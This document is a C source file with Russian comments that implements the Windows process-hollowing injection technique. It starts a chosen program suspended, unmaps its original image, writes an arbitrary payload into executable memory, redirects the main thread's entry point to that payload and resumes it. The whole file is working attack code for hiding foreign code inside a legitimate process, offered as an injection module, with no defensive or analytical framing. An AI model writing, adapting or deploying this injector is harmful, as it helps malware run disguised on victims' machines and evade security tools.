/**
 * @file process_hollowing.c
 * @brief Реализация техники внедрения Process Hollowing.
 * @author iamtomasanderson@gmail.com + Gemini
 * @date 2025-04-18
 */

#include "../include/injection.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h> // Для NtQueryInformationProcess и структур

// --- Локальные определения (могут быть вынесены в .h) --- 

// Прототип NtQueryInformationProcess (не всегда есть в winternl.h)
typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN ULONG ProcessInformationLength,
    OUT PULONG ReturnLength OPTIONAL
);

// Прототип NtUnmapViewOfSection
typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress
);

// --- Реализация --- 

// Вспомогательная функция для получения базового адреса (с чтением PEB)
static PVOID get_process_image_base(HANDLE hProcess) {
    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;
    NTSTATUS status;
    PEB peb;
    SIZE_T bytesRead;
    PVOID imageBase = NULL;

    // 1. Получаем адрес PEB
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        fprintf(stderr, "[Hollowing] Error: GetModuleHandleA(\"ntdll.dll\") failed (%lu)\n", GetLastError());
        return NULL;
    }
    pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    if (!NtQueryInformationProcess) {
        fprintf(stderr, "[Hollowing] Error: GetProcAddress(\"NtQueryInformationProcess\") failed (%lu)\n", GetLastError());
        return NULL;
    }

    status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength);
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[Hollowing] Error: NtQueryInformationProcess failed (status: 0x%lx)\n", status);
        return NULL;
    }

    if (!pbi.PebBaseAddress) {
        fprintf(stderr, "[Hollowing] Error: PebBaseAddress is NULL\n");
        return NULL;
    }

    // 2. Читаем PEB из памяти процесса
    if (!ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead) || bytesRead != sizeof(peb)) {
        fprintf(stderr, "[Hollowing] Error: ReadProcessMemory (PEB) failed (%lu)\n", GetLastError());
        return NULL;
    }

    // 3. Читаем ImageBaseAddress из PEB (адрес находится по смещению 0x10 в 64-бит, 0x8 в 32-бит)
#ifdef _WIN64
    // На 64-бит читаем указатель на ImageBaseAddress из PEB
    PVOID imageBaseAddressPtr = (PBYTE)pbi.PebBaseAddress + 0x10;
    if (!ReadProcessMemory(hProcess, imageBaseAddressPtr, &imageBase, sizeof(imageBase), &bytesRead) || bytesRead != sizeof(imageBase)) {
        fprintf(stderr, "[Hollowing] Error: ReadProcessMemory (ImageBase Ptr) failed (%lu)\n", GetLastError());
        return NULL;
    }
#else
    // На 32-бит ImageBaseAddress находится прямо в PEB по смещению 0x8
    if (!ReadProcessMemory(hProcess, (PBYTE)pbi.PebBaseAddress + 0x8, &imageBase, sizeof(imageBase), &bytesRead) || bytesRead != sizeof(imageBase)) {
        fprintf(stderr, "[Hollowing] Error: ReadProcessMemory (ImageBase) failed (%lu)\n", GetLastError());
        return NULL;
    }
#endif

    printf("[Hollowing] Debug: Got ImageBaseAddress: %p\n", imageBase);
    return imageBase;
}

int inject_hollow_process(const char* target_path_utf8, const unsigned char* payload, size_t payload_size) {
    if (!target_path_utf8 || !payload || payload_size == 0) {
        fprintf(stderr, "[Hollowing] Error: Invalid arguments.\n");
        return -1;
    }

    printf("[Hollowing] Info: Starting process hollowing for target: %s\n", target_path_utf8);

    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    BOOL success = FALSE;
    PVOID imageBase = NULL;
    PVOID remotePayloadAddress = NULL;
    CONTEXT context = {0};
    NTSTATUS status;
    HMODULE hNtdll = NULL;
    pNtUnmapViewOfSection NtUnmapViewOfSection = NULL;

    // Конвертируем путь в UTF-16 (WCHAR)
    WCHAR target_path_w[MAX_PATH];
    int chars_converted = MultiByteToWideChar(CP_UTF8, 0, target_path_utf8, -1, target_path_w, MAX_PATH);
    if (chars_converted == 0) {
        fprintf(stderr, "[Hollowing] Error: MultiByteToWideChar failed (%lu)\n", GetLastError());
        return -2;
    }

    // 1. Создаем процесс-жертву в приостановленном состоянии
    printf("[Hollowing] Debug: Creating suspended process: %ls\n", target_path_w);
    success = CreateProcessW(
        NULL,               // lpApplicationName
        target_path_w,      // lpCommandLine (используем путь как командную строку)
        NULL,               // lpProcessAttributes
        NULL,               // lpThreadAttributes
        FALSE,              // bInheritHandles
        CREATE_SUSPENDED,   // dwCreationFlags
        NULL,               // lpEnvironment
        NULL,               // lpCurrentDirectory
        &si,                // lpStartupInfo
        &pi                 // lpProcessInformation
    );

    if (!success) {
        fprintf(stderr, "[Hollowing] Error: CreateProcessW failed (%lu)\n", GetLastError());
        return -3;
    }
    printf("[Hollowing] Info: Target process created (PID: %lu, TID: %lu)\n", pi.dwProcessId, pi.dwThreadId);

    // 2. Получаем базовый адрес образа процесса
    imageBase = get_process_image_base(pi.hProcess);
    if (!imageBase) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -4;
    }

    // 3. Выгружаем оригинальный код (NtUnmapViewOfSection)
    hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
         fprintf(stderr, "[Hollowing] Error: GetModuleHandleA(\"ntdll.dll\") failed again? (%lu)\n", GetLastError());
         status = -1; // Имитация ошибки
    } else {
        NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
        if (!NtUnmapViewOfSection) {
             fprintf(stderr, "[Hollowing] Error: GetProcAddress(\"NtUnmapViewOfSection\") failed (%lu)\n", GetLastError());
             status = -1; // Имитация ошибки
        } else {
            printf("[Hollowing] Debug: Unmapping original image at %p...\n", imageBase);
            status = NtUnmapViewOfSection(pi.hProcess, imageBase);
        }
    }

    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[Hollowing] Error: NtUnmapViewOfSection failed (status: 0x%lx)\n", status);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -5;
    }
    printf("[Hollowing] Info: Original image unmapped successfully.\n");

    // 4. Выделяем новую память (желательно по старому базовому адресу)
    printf("[Hollowing] Debug: Allocating %zu bytes at preferred address %p...\n", payload_size, imageBase);
    remotePayloadAddress = VirtualAllocEx(pi.hProcess, imageBase, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remotePayloadAddress) {
        printf("[Hollowing] Warning: Failed to allocate memory at preferred address. Trying anywhere... (%lu)\n", GetLastError());
        remotePayloadAddress = VirtualAllocEx(pi.hProcess, NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remotePayloadAddress) {
            fprintf(stderr, "[Hollowing] Error: VirtualAllocEx failed (%lu)\n", GetLastError());
            TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return -6;
        }
    }
    printf("[Hollowing] Info: Memory allocated at %p\n", remotePayloadAddress);

    // 5. Записываем payload в выделенную память
    SIZE_T bytesWritten;
    printf("[Hollowing] Debug: Writing %zu bytes to %p...\n", payload_size, remotePayloadAddress);
    if (!WriteProcessMemory(pi.hProcess, remotePayloadAddress, payload, payload_size, &bytesWritten) || bytesWritten != payload_size) {
        fprintf(stderr, "[Hollowing] Error: WriteProcessMemory failed (%lu)\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remotePayloadAddress, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -7;
    }
     printf("[Hollowing] Info: Payload written successfully.\n");

    // 6. Получаем контекст потока
#ifdef _WIN64
    context.ContextFlags = CONTEXT_AMD64;
#else
    context.ContextFlags = CONTEXT_FULL;
#endif
    printf("[Hollowing] Debug: Getting thread context...\n");
    if (!GetThreadContext(pi.hThread, &context)) {
        fprintf(stderr, "[Hollowing] Error: GetThreadContext failed (%lu)\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remotePayloadAddress, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -8;
    }

    // 7. Изменяем точку входа (RCX/EAX)
#ifdef _WIN64
    printf("[Hollowing] Debug: Setting new entry point (RCX) to %p\n", remotePayloadAddress);
    context.Rcx = (DWORD64)remotePayloadAddress;
#else
    printf("[Hollowing] Debug: Setting new entry point (EAX) to %p\n", remotePayloadAddress);
    context.Eax = (DWORD)remotePayloadAddress;
#endif

    // 8. Устанавливаем измененный контекст
    printf("[Hollowing] Debug: Setting modified thread context...\n");
    if (!SetThreadContext(pi.hThread, &context)) {
        fprintf(stderr, "[Hollowing] Error: SetThreadContext failed (%lu)\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remotePayloadAddress, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -9;
    }

    // 9. Возобновляем выполнение потока
    printf("[Hollowing] Debug: Resuming thread...\n");
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
         fprintf(stderr, "[Hollowing] Error: ResumeThread failed (%lu)\n", GetLastError());
         // Процесс уже запущен с новым кодом, но мы не можем подтвердить успех
         // Возвращаем ошибку, но не убиваем процесс
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
         return -10;
    }

    // 10. Закрываем хендлы
    printf("[Hollowing] Info: Thread resumed. Closing handles.\n");
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    printf("[Hollowing] Success: Process Hollowing completed.\n");
    return 0; // Успех
}

#else // Не Windows

int inject_hollow_process(const char* target_path, const unsigned char* payload, size_t payload_size) {
    fprintf(stderr, "[Hollowing] Error: Process Hollowing is only supported on Windows.\n");
    return -1;
}

#endif // _WIN32 